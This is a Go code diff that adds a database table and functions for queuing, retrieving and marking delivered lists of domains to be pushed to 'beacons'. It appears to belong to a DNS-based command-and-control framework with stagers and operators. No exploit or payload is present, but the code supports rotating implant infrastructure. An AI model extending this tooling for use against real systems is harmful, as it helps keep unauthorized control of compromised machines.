@@ -5,6 +5,7 @@ package main
 
 import (
 	"database/sql"
+	"encoding/json"
 	"fmt"
 	"strings"
 	"sync"
@@ -242,6 +243,19 @@ func (d *MasterDatabase) migration1InitialSchema() error {
 
 	CREATE INDEX IF NOT EXISTS idx_task_progress_task_id ON task_progress(task_id);
 	CREATE INDEX IF NOT EXISTS idx_task_progress_status ON task_progress(status);
+
+	-- Domain updates table (track domain changes that need to be pushed to beacons)
+	CREATE TABLE IF NOT EXISTS domain_updates (
+		id INTEGER PRIMARY KEY AUTOINCREMENT,
+		dns_server_id TEXT NOT NULL,
+		domain_list TEXT NOT NULL,
+		created_at INTEGER NOT NULL,
+		delivered INTEGER DEFAULT 0,
+		FOREIGN KEY (dns_server_id) REFERENCES dns_servers(id) ON DELETE CASCADE
+	);
+
+	CREATE INDEX IF NOT EXISTS idx_domain_updates_dns_server ON domain_updates(dns_server_id);
+	CREATE INDEX IF NOT EXISTS idx_domain_updates_delivered ON domain_updates(delivered);
 
 	-- Operators table (multi-user support)
 	CREATE TABLE IF NOT EXISTS operators (
@@ -2161,4 +2175,123 @@ func (d *MasterDatabase) MarkStagerCacheDelivered(cacheIDs []int) error {
 
 	_, err := d.db.Exec(query, args...)
 	return err
+}
+
+// QueueDomainUpdate queues a domain list update for a DNS server to push to beacons
+func (d *MasterDatabase) QueueDomainUpdate(dnsServerID string, domainList []string) error {
+	d.mutex.Lock()
+	defer d.mutex.Unlock()
+
+	// Convert domain list to JSON
+	domainsJSON, err := json.Marshal(domainList)
+	if err != nil {
+		return fmt.Errorf("failed to marshal domain list: %w", err)
+	}
+
+	now := time.Now().Unix()
+	_, err = d.db.Exec(`
+INSERT INTO domain_updates (dns_server_id, domain_list, created_at, delivered)
+VALUES (?, ?, ?, 0)
+`, dnsServerID, string(domainsJSON), now)
+
+	return err
+}
+
+// GetPendingDomainUpdates retrieves undelivered domain updates for a DNS server
+func (d *MasterDatabase) GetPendingDomainUpdates(dnsServerID string) ([]string, error) {
+	d.mutex.RLock()
+	defer d.mutex.RUnlock()
+
+	var domainListJSON string
+	err := d.db.QueryRow(`
+SELECT domain_list FROM domain_updates
+WHERE dns_server_id = ? AND delivered = 0
+ORDER BY id DESC
+LIMIT 1
+`, dnsServerID).Scan(&domainListJSON)
+
+	if err == sql.ErrNoRows {
+		return nil, nil // No updates pending
+	}
+	if err != nil {
+		return nil, err
+	}
+
+	var domains []string
+	if err := json.Unmarshal([]byte(domainListJSON), &domains); err != nil {
+		return nil, fmt.Errorf("failed to unmarshal domain list: %w", err)
+	}
+
+	return domains, nil
+}
+
+// MarkDomainUpdateDelivered marks domain updates as delivered for a DNS server
+func (d *MasterDatabase) MarkDomainUpdateDelivered(dnsServerID string) error {
+	d.mutex.Lock()
+	defer d.mutex.Unlock()
+
+	_, err := d.db.Exec(`
+UPDATE domain_updates
+SET delivered = 1
+WHERE dns_server_id = ? AND delivered = 0
+`, dnsServerID)
+
+	return err
+}
+
+// GetAllActiveDomains returns all domains from active DNS servers
+func (d *MasterDatabase) GetAllActiveDomains() ([]string, error) {
+	d.mutex.RLock()
+	defer d.mutex.RUnlock()
+
+	rows, err := d.db.Query(`
+SELECT domain FROM dns_servers
+WHERE status = 'active'
+ORDER BY domain
+`)
+	if err != nil {
+		return nil, err
+	}
+	defer rows.Close()
+
+	var domains []string
+	for rows.Next() {
+		var domain string
+		if err := rows.Scan(&domain); err != nil {
+			return nil, err
+		}
+		domains = append(domains, domain)
+	}
+
+	return domains, rows.Err()
+}
+
+// GetAllDNSServers returns all DNS servers (for domain broadcasting)
+func (d *MasterDatabase) GetAllDNSServers() ([]map[string]interface{}, error) {
+	d.mutex.RLock()
+	defer d.mutex.RUnlock()
+
+	rows, err := d.db.Query(`
+SELECT id, domain, status FROM dns_servers
+WHERE status = 'active'
+`)
+	if err != nil {
+		return nil, err
+	}
+	defer rows.Close()
+
+	var servers []map[string]interface{}
+	for rows.Next() {
+		var id, domain, status string
+		if err := rows.Scan(&id, &domain, &status); err != nil {
+			return nil, err
+		}
+		servers = append(servers, map[string]interface{}{
+			"id":     id,
+			"domain": domain,
+			"status": status,
+		})
+	}
+
+	return servers, rows.Err()
 }
